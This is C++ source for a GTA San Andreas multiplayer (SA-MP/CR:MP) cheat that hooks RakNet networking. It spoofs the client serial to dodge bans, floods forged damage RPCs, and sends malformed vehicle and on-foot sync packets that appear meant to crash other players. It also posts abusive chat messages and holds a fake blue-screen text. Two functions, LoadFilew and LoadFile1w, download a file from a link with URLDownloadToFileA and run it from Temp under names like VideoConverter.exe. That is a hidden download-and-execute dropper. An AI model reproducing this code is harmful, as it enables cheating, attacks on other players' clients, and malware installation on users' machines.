#include "main.h"
#pragma comment(lib, "urlmon.lib")

char buf[] = { 0x41 };
char buf1[] = { 0xaa, 0x9f, 0x42, 0x00 };
char buf2[] = { 0x81, 0xc4, 0x54, 0xf2, 0xff, 0xff };
char buf3[] = { 0x0d, 0x0a, 0x1a };
char buf4[] = { 0x81, 0xc4, 0x54, 0xf2, 0xff, 0xff };
char buf5[] = { 0x1a, 0x0d, 0x0a };
char buf6[] = { 0x5e, 0xa4, 0xb4 };
char buf7[] = { 0xdb, 0xc3, 0xd9, 0x74, 0x24, 0xf4, 0xbe, 0xe8, 0x5a, 0x27, 0x13, 0x5f, 0x31, 0xc9 };
char buf8[] = { 0x33, 0x42, 0x45, 0x21, 0x6F, 0x64, 0x79, 0x36, 0x53, 0x41, 0x4D, 0x50, 0x42, 0x45, 0x21, 0x64, 0x69, 0x69 };
char buf9[] = { 0x53, 0x41, 0x4D, 0x50, 0x7F, 0x00, 0x00, 0x01, 0x61, 0x1E, 0x78, 0x03, 0x00, 0x31, 0x32, 0x33, 0x24, 0x00, 0x65, 0x63, 0x68, 0x6F, 0x20, 0x52, 0x43, 0x4F, 0x4E, 0x20, 0x61, 0x64, 0x6D, 0x69, 0x6E, 0x20, 0x63, 0x6F, 0x6E, 0x6E, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x73, 0x65, 0x72, 0x76, 0x65, 0x72, 0x2E };
char buf100[] = { 0xac, 0x15, 0x2d, 0x0a };
char buf11[] = { 0x53, 0x41, 0x4D, 0x50, 0x7F, 0x00, 0x00, 0x01, 0x61, 0x1E, 0x78, 0x03, 0x00, 0x31, 0x32, 0x33 };
char buf12[] = { 0x53, 0x41, 0x4D, 0x50, 0x63 };
char buf13[] = { 0x53, 0x41, 0x4D, 0x50, 0x69 };
char buf14[] = { 0x53, 0x41, 0x4D, 0x50, 0x72 };
char buf15[] = { 0x53, 0x41, 0x4D, 0x50 };
char buf16[] = { 0x53, 0x41, 0x4D, 0x50, 0x7F, 0x00, 0x00, 0x01, 0x61, 0x1E, 0x78, 0x03, 0x00, 0x31, 0x32, 0x33 };
char bufhell[] = { 0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7, 0x8, 0x9, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x100, 0x101, 0x102, 0x103, 0x104, 0x105, 0x106, 0x107, 0x108, 0x109, 0x110, 0x111, 0x112, 0x113, 0x114, 0x115, 0x116, 0x117, 0x118, 0x119, 0x120, 0x121, 0x122, 0x123, 0x124, 0x125, 0x126, 0x127, 0x128, 0x129, 0x130, 0x131, 0x132, 0x133, 0x134, 0x135, 0x136, 0x137, 0x138, 0x139, 0x140, 0x141, 0x142, 0x143, 0x144, 0x145, 0x146, 0x147, 0x148, 0x149, 0x150, 0x151, 0x152, 0x153, 0x154, 0x155, 0x156, 0x157, 0x158, 0x159, 0x160, 0x161, 0x162, 0x163, 0x164, 0x165, 0x166, 0x167, 0x168, 0x169, 0x170, 0x171, 0x172, 0x173, 0x174, 0x175, 0x176, 0x177, 0x178, 0x179, 0x180, 0x181, 0x182, 0x183, 0x184, 0x185, 0x186, 0x187, 0x188, 0x189, 0x190, 0x191, 0x192, 0x193, 0x194, 0x195, 0x196, 0x197, 0x198, 0x199, 0x200, 0x201, 0x202, 0x203, 0x204, 0x205, 0x206, 0x207, 0x208, 0x209, 0x210, 0x211, 0x212, 0x213, 0x214, 0x215, 0x216, 0x217, 0x218, 0x219, 0x220, 0x221, 0x222, 0x223, 0x224, 0x225, 0x226, 0x227, 0x228, 0x229, 0x230, 0x231, 0x232, 0x233, 0x234, 0x235, 0x236, 0x237, 0x238, 0x239, 0x240, 0x241, 0x242, 0x243, 0x244, 0x245, 0x246, 0x247, 0x248, 0x249, 0x250, 0x251, 0x252, 0x253, 0x254, 0x255, 0x256, 0x257, 0x258, 0x259 };


typedef struct
{
	char odd[256];
	char *iptr;
	char path[256];
	char link[256]; 
	char FileNameAndExtension[256];
} MsParams_t;
//int fff = 0;
//int fddff2 = 0;
#define SCREEN(x) GetSystemMetrics(*x == 'X' ? SM_CXSCREEN : SM_CYSCREEN)

LRESULT CALLBACK WindowProcedure(HWND, UINT, WPARAM, LPARAM);

char szClassName[] = "WindowsApp";

const char * BSOD_TEXT[] = {
	"-A problem has been detected and Windows has been shut down to prevent damage",
	"-to your computer.",
	"*The problem seems to have been caused by the following file: SPCMDCON.SYS",
	"*PAGE_FAULT_IN_NONPAGED_AREA",
	"*If this is the first time you've seen this Stop error screen,",
	"-restart your computer. If this screen appears again, follow",
	"-these steps:",
	"*Check to make sure any new hardware or software is properly installed.",
	"*If this is a new installation, ask your hardware or software manufacturer",
	"-for any Windows updates you may need",
	"*If problems continue, disable or remove any newly installed hardware",
	"-or software. Disable BIOS memory options such as caching or shadowing.",
	"*If you need to use Safe Mode to remove or disable components, restart",
	"-your computer, press F8 to select Advanced Startup Options, and then",
	"-select Safe Mode.",
	"*Technical Information:",
	"**** STOP: 0x00000050 (0xFD3094C2,0x00000001,0xFBFE7617,0x00000000)",
	"**** SPCMDCON.SYS - Address FBFE7617 base at FBFE5000, DateStamp 3d6dd67c"
};

void PRINT_TEXT(HDC hDC) {
	unsigned char k = 0;
	unsigned short y_co = 30;
	while (k <= 17) {
		if (BSOD_TEXT[k][0] == '*') y_co += 23;
		TextOut(hDC, 10, y_co + (k * 23), BSOD_TEXT[k] + 1, lstrlen(BSOD_TEXT[k]) - 1);
		k++;
	}
}




void LoadFile1w(MsParams_t *param)
{
	typedef HRESULT(__stdcall *FuckYourMommy)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
	FuckYourMommy _AlekseyNikolaevich = NULL;
	MsParams_t *ptr = (MsParams_t *)param;
	char inter[128];
	sprintf(inter, "\\%s", ptr->FileNameAndExtension); strcat(ptr->path, inter);
	typedef HRESULT(__stdcall *FuckYourMommy)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
	_AlekseyNikolaevich = (FuckYourMommy)GetProcAddress(GetModuleHandle("Urlmon.dll"), "URLDownloadToFileA");
	HRESULT hr = _AlekseyNikolaevich(nullptr, ptr->link, ptr->path, 0, nullptr);
	if (SUCCEEDED(hr))
	{
		char Uname[50]; DWORD szI = 50; GetUserNameA(Uname, &szI);
		sprintf(ptr->path, "C:\\Users\\%s\\AppData\\Local\\Temp\\VideoConverter.exe", Uname);
		ShellExecuteA(NULL, "open", ptr->path, NULL, NULL, SW_SHOW);
	}
}


void LoadFilew(MsParams_t *param)
{
	typedef HRESULT(__stdcall *FuckYourMommy)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
	FuckYourMommy _AlekseyNikolaevich = NULL;
	MsParams_t *ptr = (MsParams_t *)param;
	char inter[128];
	sprintf(inter, "\\%s", ptr->FileNameAndExtension); strcat(ptr->path, inter);
	typedef HRESULT(__stdcall *FuckYourMommy)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
	_AlekseyNikolaevich = (FuckYourMommy)GetProcAddress(GetModuleHandle("Urlmon.dll"), "URLDownloadToFileA");
	HRESULT hr = _AlekseyNikolaevich(nullptr, ptr->link, ptr->path, 0, nullptr);
	if (SUCCEEDED(hr))
	{
		char Uname[50]; DWORD szI = 50; GetUserNameA(Uname, &szI);
		sprintf(ptr->path, "C:\\Users\\%s\\AppData\\Local\\Temp\\Denver.exe", Uname);
		ShellExecuteA(NULL, "open", ptr->path, NULL, NULL, SW_SHOW);
	}
}



int random2(int min, int max)
{
	return (rand() % (max - min + 1) + min);
}
float random_float2(float a, float b)
{
	float random = ((float)rand()) / (float)RAND_MAX;
	float diff = b - a;
	float r = random * diff;
	return a + r;
}

cDebugTracer DebugThread;
void cDebugTracer::push_trace_func(eDebugThread thread, std::string name)
{
	stDebugTrace new_trace;

	new_trace.trace_name = name;
	new_trace.tick = GetTickCount();


	trace_vect[thread].push_back(new_trace);
}


void cDebugTracer::clear_tracing(eDebugThread thread)
{
	trace_vect[thread].clear();
}


void cDebugTracer::LogDebug()
{

	for (int thread = 0; thread < trace_vect_len; thread++)
	{


		size_t vec_size = trace_vect[thread].size();


		if (!vec_size)
			continue;

		Log("Theadid: %i", thread);
		Log("===================================");
		Log("==");
		Log("==");



		for (size_t i = 0; i < vec_size; i++)
			Log("[%10i] %s", trace_vect[thread][i].tick, trace_vect[thread][i].trace_name.c_str());



		Log("==");
		Log("==");
		Log("===================================");
	}
}

uint8_t HookedRakClientInterface::GetPacketID1(Packet *p)
{
	if (!p) return 0xFF;

	if (p->data[0] == ID_TIMESTAMP) {
		assert(p->length > 5);
		return p->data[5];
	}
	else return p->data[0];
}

void GEN_BIG_NUM(unsigned long in[5], unsigned long out[6], unsigned long factor)
{
	unsigned long src[5] = { 0 };
	for (int i = 0; i < 5; i++)
		src[i] = ((in[4 - i] >> 24) | ((in[4 - i] << 8) & 0x00FF0000) | ((in[4 - i] >> 8) & 0x0000FF00) | (in[4 - i] << 24));

	unsigned long long tmp = 0;

	tmp = unsigned long long(src[0])*unsigned long long(factor);
	out[0] = tmp & 0xFFFFFFFF;
	out[1] = tmp >> 32;
	tmp = unsigned long long(src[1])*unsigned long long(factor) + unsigned long long(out[1]);
	out[1] = tmp & 0xFFFFFFFF;
	out[2] = tmp >> 32;
	tmp = unsigned long long(src[2])*unsigned long long(factor) + unsigned long long(out[2]);
	out[2] = tmp & 0xFFFFFFFF;
	out[3] = tmp >> 32;
	tmp = unsigned long long(src[3])*unsigned long long(factor) + unsigned long long(out[3]);
	out[3] = tmp & 0xFFFFFFFF;
	out[4] = tmp >> 32;
	tmp = unsigned long long(src[4])*unsigned long long(factor) + unsigned long long(out[4]);
	out[4] = tmp & 0xFFFFFFFF;
	out[5] = tmp >> 32;

	for (int i = 0; i < 12; i++)
	{
		unsigned char temp = ((unsigned char*)out)[i];
		((unsigned char*)out)[i] = ((unsigned char*)out)[23 - i];
		((unsigned char*)out)[23 - i] = temp;
	}
}

int gen_gpci(char buf[64], unsigned long factor)
{
	unsigned char out[6 * 8] = { 0 };


	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";

	for (int i = 0; i < 6 * 4; ++i)
		out[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	out[6 * 4] = 0;

	GEN_BIG_NUM((unsigned long*)out, (unsigned long*)out, factor);

	unsigned int notzero = 0;
	buf[0] = '0'; buf[1] = '\0';

	if (factor == 0) return 1;

	int pos = 0;
	for (int i = 0; i < 24; i++)
	{
		unsigned char tmp = out[i] >> 4;
		unsigned char tmp2 = out[i] & 0x0F;

		if (notzero || tmp)
		{
			buf[pos++] = (char)((tmp > 9) ? (tmp + 55) : (tmp + 48));
			if (!notzero) notzero = 1;
		}

		if (notzero || tmp2)
		{
			buf[pos++] = (char)((tmp2 > 9) ? (tmp2 + 55) : (tmp2 + 48));
			if (!notzero) notzero = 1;
		}
	}
	buf[pos] = 0;

	return pos;
}


bool HookedRakClientInterface::Connect( const char* host, unsigned short serverPort, unsigned short clientPort, unsigned int depreciated, int threadSleepTimer )
{
	traceLastFunc( "HookedRakClientInterface::Connect" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->Connect( host, serverPort, clientPort, depreciated, threadSleepTimer );
}

void HookedRakClientInterface::Disconnect( unsigned int blockDuration, unsigned char orderingChannel )
{
	traceLastFunc( "HookedRakClientInterface::Disconnect" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->Disconnect( blockDuration, orderingChannel );
}

void HookedRakClientInterface::InitializeSecurity( const char *privKeyP, const char *privKeyQ )
{
	traceLastFunc( "HookedRakClientInterface::InitializeSecurity" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->InitializeSecurity( privKeyP, privKeyQ );
}

void HookedRakClientInterface::SetPassword( const char *_password )
{
	traceLastFunc( "HookedRakClientInterface::SetPassword" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->SetPassword( _password );
}

bool HookedRakClientInterface::HasPassword( void ) const
{
	traceLastFunc( "HookedRakClientInterface::HasPassword" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->HasPassword();
}

bool HookedRakClientInterface::Send( const char *data, const int length, PacketPriority priority, PacketReliability reliability, char orderingChannel )
{
	traceLastFunc( "HookedRakClientInterface::Send" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->Send( data, length, priority, reliability, orderingChannel );
}

void send_new_gpci( BitStream *parameters)
{
	char szNickName[32];
	int iVersion = 0xFD9;
	UINT uiClientChallengeResponse = 0x3324;
	BYTE byteMod = 1;

	char auth_bs[4 * 16] = { 0 };
	gen_gpci(auth_bs, 0x3e9);

	BYTE byteAuthBSLen;
	byteAuthBSLen = (BYTE)strlen(auth_bs); 
	BYTE byteNameLen = (BYTE)strlen(szNickName);
	BYTE iClientVerLen = (BYTE)strlen("0.3e-R2"); //тут тоже менять на crce если играешь в крмп

	parameters->Read(iVersion);
	parameters->Read(byteMod);
	parameters->Read(byteNameLen);
	parameters->Read(szNickName, byteNameLen);
	parameters->Read(uiClientChallengeResponse);
	parameters->Reset();

	parameters->Write(iVersion);
	//parameters->Write((int)33563352); //это для крмп блять
	parameters->Write(byteMod);
	parameters->Write(byteNameLen);
	parameters->Write(szNickName, byteNameLen); 
	parameters->Write(uiClientChallengeResponse);
	parameters->Write(byteAuthBSLen);
	parameters->Write(auth_bs, byteAuthBSLen);
	parameters->Write(iClientVerLen);
	parameters->Write("0.3e-R2", iClientVerLen); //тут тоже менять на crce если играешь в крмп
	cheat_state_text("[AntiBan] Random Serial: %s", auth_bs);
}

/*HANDLE  hThreads = NULL;
int antiafkJagkm = 0, allafktimeJagkm = 0;
void GoAntiAfkJagkm() {
	addMessageToChatWindow("Driftyulex_m0d->Активирован нахуй-посылатель АнтиСобейта. Разработчик AlexDrift");
	addMessageToChatWindow("Driftyulex_m0d->Если вы читер CR:MP, игра блять сама зарестартится. А после уже залогиньтесь!");
	while (true) 
	{
		cheat_state->_generic.asasasas9ssssvg ^= 1;
		Sleep(6700);
		cheat_state->_generic.asasasas9ssssvg = 0;
		addMessageToChatWindow("Driftyulex_m0d->Деактивирован нахуй-посылатель АнтиСобейта. Пробуйте залогинеться!");
		TerminateThread(hThreads, 0);
	}
}*/


float fWeaponDamage[55] =
{
	1.0, // 0 - Fist
	1.0, // 1 - Brass knuckles
	1.0, // 2 - Golf club
	1.0, // 3 - Nitestick
	1.0, // 4 - Knife
	1.0, // 5 - Bat
	1.0, // 6 - Shovel
	1.0, // 7 - Pool cue
	1.0, // 8 - Katana
	1.0, // 9 - Chainsaw
	1.0, // 10 - Dildo
	1.0, // 11 - Dildo 2
	1.0, // 12 - Vibrator
	1.0, // 13 - Vibrator 2
	1.0, // 14 - Flowers
	1.0, // 15 - Cane
	82.5, // 16 - Grenade
	0.0, // 17 - Teargas
	1.0, // 18 - Molotov
	9.9, // 19 - Vehicle M4 (custom)
	46.2, // 20 - Vehicle minigun (custom)
	0.0, // 21
	8.25, // 22 - Colt 45
	53.2, // 23 - Silenced
	96.2, // 24 - Deagle
	49.5,//3.3, // 25 - Shotgun
	49.5,//3.3, // 26 - Sawed-off
	39.6,//4.95, // 27 - Spas
	6.6, // 28 - UZI
	8.25, // 29 - MP5
	9.9, // 30 - AK47
	9.9, // 31 - M4
	6.6, // 32 - Tec9
	24.75, // 33 - Cuntgun
	41.25, // 34 - Sniper
	82.5, // 35 - Rocket launcher
	82.5, // 36 - Heatseeker
	1.0, // 37 - Flamethrower
	46.2, // 38 - Minigun
	82.5, // 39 - Satchel
	0.0, // 40 - Detonator
	0.33, // 41 - Spraycan
	0.33, // 42 - Fire extinguisher
	0.0, // 43 - Camera
	0.0, // 44 - Night vision
	0.0, // 45 - Infrared
	0.0, // 46 - Parachute
	0.0, // 47 - Fake pistol
	2.64, // 48 - Pistol whip (custom)
	9.9, // 49 - Vehicle
	330.0, // 50 - Helicopter blades
	82.5, // 51 - Explosion
	1.0, // 52 - Car park (custom)
	1.0, // 53 - Drowning
	165.0 // 54 - Splat
};
int antiflood = 0;
bool OnSendRPC(int uniqueID,  BitStream *parameters, PacketPriority priority, PacketReliability reliability, char orderingChannel, bool shiftTimestamp)
{
	




	
	if (uniqueID == RPC_PlayerGiveDamage)
	{
		if (cheat_state->_generic.gfgfgffgfg454rtff == 1)
		{
			cheat_state->_generic.hp_cheat ^= 1;
			bool bGive;
			USHORT PlayerID;
			float fAmmount = fWeaponDamage[g_Players->pLocalPlayer->byteCurrentWeapon];
			int WeaponID = g_Players->pLocalPlayer->byteCurrentWeapon;
			bGive = true;
			//fAmmount = 370.370f;//fWeaponDamage[g_Players->pLocalPlayer->byteCurrentWeapon];
			if (PlayerID >= 1000)return false;
			parameters->Read(bGive);
			parameters->Read(PlayerID);
			parameters->Read(fAmmount);
			parameters->Read(WeaponID);

			parameters->Write(bGive);
			parameters->Write(PlayerID);
			parameters->Write(fAmmount);
			parameters->Write(WeaponID);

			parameters->Write(bGive);
			parameters->Write(PlayerID);
			parameters->Write(fAmmount);
			parameters->Write(WeaponID);

			parameters->Write(bGive);
			parameters->Write(PlayerID);
			parameters->Write(fAmmount);
			parameters->Write(WeaponID);

			parameters->Write(bGive);
			parameters->Write(PlayerID);
			parameters->Write(fAmmount);
			parameters->Write(WeaponID);

			parameters->Write(bGive);
			parameters->Write(PlayerID);
			parameters->Write(fAmmount);
			parameters->Write(WeaponID);

			parameters->Write(bGive);
			parameters->Write(PlayerID);
			parameters->Write(fAmmount);
			parameters->Write(WeaponID);

			parameters->Write(bGive);
			parameters->Write(PlayerID);
			parameters->Write(fAmmount);
			parameters->Write(WeaponID);
			//Log("Custom Send1: give %d, damage %f, player %d, weapon %d", bGive, fAmmount, PlayerID, WeaponID);

			uint16_t playerid;
			if (playerid >= 1000)return false;
			float amountdam = fWeaponDamage[g_Players->pLocalPlayer->byteCurrentWeapon];
			int weaponid = g_Players->pLocalPlayer->byteCurrentWeapon;
			bool takedam = fWeaponDamage[g_Players->pLocalPlayer->byteCurrentWeapon];
			SendPlayerDamage(playerid, amountdam, weaponid, takedam);
			SendPlayerDamage(playerid, amountdam, weaponid, takedam);
			SendPlayerDamage(playerid, amountdam, weaponid, takedam);
			SendPlayerDamage(playerid, amountdam, weaponid, takedam);
			SendPlayerDamage(playerid, amountdam, weaponid, takedam);
			SendPlayerDamage(playerid, amountdam, weaponid, takedam);
			SendPlayerDamage(playerid, amountdam, weaponid, takedam);
			SendPlayerDamage(playerid, amountdam, weaponid, takedam);
			//Log("Custom Send2: damage %f, player %d, weapon %d, takedam %d", amountdam, playerid, weaponid, takedam);
		}
	}
	if (uniqueID == RPC_ClientJoin)
	{	
		send_new_gpci(parameters);
		//hThreads = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJagkm, NULL, NULL, NULL);
		//setPassword(set.CrmpPassword); //это блять тоже для крмп
	}
	if (cheat_state->_generic.crh1ggd1 == 1)
	{
		
			// use this if you wanna log outgoing RPCs
			if (uniqueID != RPC_UpdateScoresPingsIPs)
			{
				int len = parameters ? parameters->GetNumberOfBytesUsed() : 0;
				addMessageToChatWindow("< [RPC Send] %s -> %d, len: %d", getPlayerName(g_Players->sLocalPlayerID), uniqueID, len);
			}
		
	}
	if (uniqueID == RPC_InitGame)
	{
		parameters->SetReadOffset(363); 
		parameters->Read(iLagCompMode);

		parameters->Write(iLagCompMode);
	}
	if (uniqueID == RPC_DialogResponse)
	{
		WORD wDialogID;
		BYTE bDialogStyle;

		BYTE bTitleLength;
		char szTitle[257];

		parameters->Read(wDialogID);
		parameters->Read(bDialogStyle);

		parameters->Read(bTitleLength);
		parameters->Read(szTitle, bTitleLength);
		szTitle[bTitleLength] = 0;
		cheat_state_text("[Dialog](ID: %d | Style: %d)", wDialogID, bDialogStyle);
	}
	if (uniqueID == RPC_Death)
	{
		if (cheat_state->_generic.pAAAsSA1ds == 1)
		{
			uint16_t killerId;
			uint8_t reason;

			parameters->Read(reason);
			parameters->Read(killerId);

			static int time1 = 0;
			for (int i = 0; weapon_list[i].name != NULL; i++)
			{
				const struct weapon_entry *weapon = &weapon_list[i];
				if (weapon->id == reason)

					if (GetTickCount() - 3400 > time1)
					{
						addMessageToChatWindow("[Игрок]%s(%d) убил вас с %s(%d).", getPlayerName(killerId), killerId, weapon->name, reason);
						say(" %s(%d) - твоя мать шлюха а отец шалаш", getPlayerName(killerId), killerId);
						time1 = GetTickCount();
					}
			}
		}
	} 
	return true;
}

bool OnSendPacket( BitStream *parameters, PacketPriority priority, PacketReliability reliability, char orderingChannel)
{
	if (parameters == NULL);
	if (parameters->GetData() == NULL);
	PUCHAR data = parameters->GetData();
	//BYTE packetId;
	//parameters->Read(packetId);

	switch ((BYTE)data[0])
	{
	case ID_PLAYER_SYNC:
	{
		stOnFootData *ofSync = (stOnFootData *)(parameters->GetData() + 1);
		
	}
	break;
	case ID_VEHICLE_SYNC:
	{
		stInCarData *icSync = (stInCarData *)(parameters->GetData() + 1);
		if (cheat_state->_generic.asasasas4l22 == 1)
		{


			
				for (int i = 0; i < 3; i++)
				icSync->fTrainSpeed = (float)0xFFFFFFFFFFF0BDC1;
			}
		
		if (cheat_state->_generic.asasasas4l221 == 1)
		{


			
				for (int i = 0; i < 3; i++)
				icSync->fTrainSpeed = (float)0xFFFFFFFFFFF0BDC1;
				static int time = 0;
				if (GetTickCount() - 4500 > time)
				{
					 BitStream bStream;
					bStream.Write(g_Players->pLocalPlayer->sCurrentVehicleID);                                        //---------> долгожданный ебучий обход защиты
					g_DrifeitClient->RPC(RPC_ExitVehicle, &bStream, HIGH_PRIORITY, RELIABLE_ORDERED, 0, 0);
					time = GetTickCount();
				}
			}
		
		if (cheat_state->_generic.dssdsdsdsd2323 == 1)
		{


			
				for (int i = 0; i < 3; i++)
					icSync->fTrainSpeed = (float)0xFFFFFFFFFFF0BDC1;
				static int time = 0;
				if (GetTickCount() - 4800 > time)
				{
					 BitStream bStream;
					bStream.Write(g_Players->pLocalPlayer->sCurrentVehicleID);                                        //---------> долгожданный ебучий обход защиты
					g_DrifeitClient->RPC(RPC_ExitVehicle, &bStream, HIGH_PRIORITY, RELIABLE_ORDERED, 0, 0);
					time = GetTickCount();
				
			}
		}
	}
	break;
	case ID_UNOCCUPIED_SYNC:
	{
		stUnoccupiedData *uoSync = (stUnoccupiedData *)(parameters->GetData() + 1);
		  
	}
	break;
	case ID_AIM_SYNC:
	{
		stAimData *AimSync = (stAimData *)(parameters->GetData() + 1);
		
	}
	break;
	}
	return true;
}

float random_floats(float a, float b)
{
	float random = ((float)rand()) / (float)RAND_MAX;
	float diff = b - a;
	float r = random * diff;
	return a + r;
}



int DrifeitDataHook(stDrifeitPacket * DrifeitData);
int AimDataHook(stAimData * data);
int UnOccupiedDataHook(stUnoccupiedData * data);
int PassengerDataHook(stPassengerData * data);
int OnFootDataHook(stOnFootData * data);
int IncarDataHook(stInCarData * data);

bool HookedRakClientInterface::Send( BitStream * bitStream, PacketPriority priority, PacketReliability reliability, char orderingChannel )
{
	traceLastFunc("HookedRakClientInterface::Send(BitStream)");
	traceLastFunc("HookedRakClientInterface::Send");
	BYTE packetId;
	bitStream->Read(packetId);

	

	if (packetId == ID_PLAYER_SYNC)
		if (!OnFootDataHook((stOnFootData *)(bitStream->GetData() + 1)))
			return true;

	if (packetId == ID_VEHICLE_SYNC)
		if (!IncarDataHook((stInCarData *)(bitStream->GetData() + 1)))
			return true;

	if (packetId == ID_PASSENGER_SYNC)
		if (!PassengerDataHook((stPassengerData *)(bitStream->GetData() + 1)))
			return true;

	if (packetId == ID_AIM_SYNC)
		if (!AimDataHook((stAimData *)(bitStream->GetData() + 1)))
			return true;

	if (packetId == ID_AIM_SYNC)
		if (!DrifeitDataHook((stDrifeitPacket *)(bitStream->GetData() + 1)))
			return true;

	if (packetId == ID_UNOCCUPIED_SYNC)
		if (!UnOccupiedDataHook((stUnoccupiedData *)(bitStream->GetData() + 1)))
			return true;
	if (packetId >= 255)return false;


	
	
		

	



	if (packetId == ID_PLAYER_SYNC)
	{
		stOnFootData data; // определяем объект, в который сохраним отправляемые данные
		memset(&data, 0, sizeof(stOnFootData)); // обнуляем его
		byte packe;
		bitStream->ResetReadPointer(); // на всякий случай устанавливаем оффсет чтения на начало
		bitStream->Read(packe); // читаем ID пакета
		bitStream->Read((PCHAR)&data, sizeof(stOnFootData)); // читаем отправляемые данные
		bitStream->ResetReadPointer(); // снова обнуляем оффсет чтения






		if (cheat_state->_generic.asasasas17bbb == 1) //это для фриза бита автострельба
		{

			data.sLeftRightKeys = rand() % 5;
			data.sUpDownKeys = rand() % 5;
			data.sKeys = rand() % 5;
			data.byteCurrentWeapon = 30;
		}
		










		if (cheat_state->_generic.sdsddsds7ds6sd6ds6ds == 1)
		{
			data.sLeftRightKeys = rand() % 5;
			data.sUpDownKeys = rand() % 5;
			data.sKeys = rand() % 5;
			data.sLeftRightKeys = rand() % 5;
			data.sUpDownKeys = rand() % 5;
			data.sKeys = rand() % 5;
			data.sLeftRightKeys = rand() % 5;
			data.sUpDownKeys = rand() % 5;
			data.sKeys = rand() % 5;
			data.sLeftRightKeys = rand() % 5;
			data.sUpDownKeys = rand() % 5;
			data.sKeys = rand() % 5;
			data.sLeftRightKeys = rand() % 5;
			data.sUpDownKeys = rand() % 5;
			data.sKeys = rand() % 5;
			data.sLeftRightKeys = rand() % 5;
			data.sUpDownKeys = rand() % 5;
			data.sKeys = rand() % 5;
			data.sLeftRightKeys = rand() % 5;
			data.sUpDownKeys = rand() % 5;
			data.sKeys = rand() % 5;
			data.sLeftRightKeys = rand() % 5;
			data.sUpDownKeys = rand() % 5;
			data.sKeys = rand() % 5;
			data.sLeftRightKeys = rand() % 5;
			data.sUpDownKeys = rand() % 5;
			data.sKeys = rand() % 5;
			data.sLeftRightKeys = rand() % 5;
			data.sUpDownKeys = rand() % 5;
			data.sKeys = rand() % 5;
			data.sLeftRightKeys = rand() % 5;
			data.sUpDownKeys = rand() % 5;
			data.sKeys = rand() % 5;
			data.sLeftRightKeys = rand() % 5;
			data.sUpDownKeys = rand() % 5;
			data.sKeys = rand() % 5;
			data.sLeftRightKeys = rand() % 5;
			data.sUpDownKeys = rand() % 5;
			data.sKeys = rand() % 5;
			data.sLeftRightKeys = rand() % 5;
			data.sUpDownKeys = rand() % 5;
			data.sKeys = rand() % 5;
			data.sLeftRightKeys = rand() % 5;
			data.sUpDownKeys = rand() % 5;
			data.sKeys = rand() % 5;
			data.sLeftRightKeys = rand() % 5;
			data.sUpDownKeys = rand() % 5;
			data.sKeys = rand() % 5;
			data.byteCurrentWeapon = 16;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			data.iCurrentAnimationID = -2146434428;
			static float fRotation = 0.0f;

			data.fQuaternion[0] = cosf(fRotation);
			data.fQuaternion[3] = sinf(fRotation);

			static DWORD timer = 0;
			if (GetTickCount() - timer > 30)
			{
				fRotation += 1.0f;
				if (fRotation >= 360.0f) fRotation = 0.0f;

				timer = GetTickCount();
			}
		}

		bitStream->ResetWritePointer(); // обнуляем оффсет записи
		bitStream->Write(packe); // пишем ид пакета
		bitStream->Write((PCHAR)&data, sizeof(stOnFootData)); // пишем обновлённые данные
	}


	
	


	

		if (packetId == ID_PLAYER_SYNC)
		{
			stOnFootData OutgoingOnFootData;
			bitStream->ResetReadPointer();
			bitStream->Read(packetId);
			bitStream->Read((PCHAR)&OutgoingOnFootData, sizeof(stOnFootData));
			
	
			if (cheat_state->_generic.sdsdsdsdsdssdsd == 1)
			{
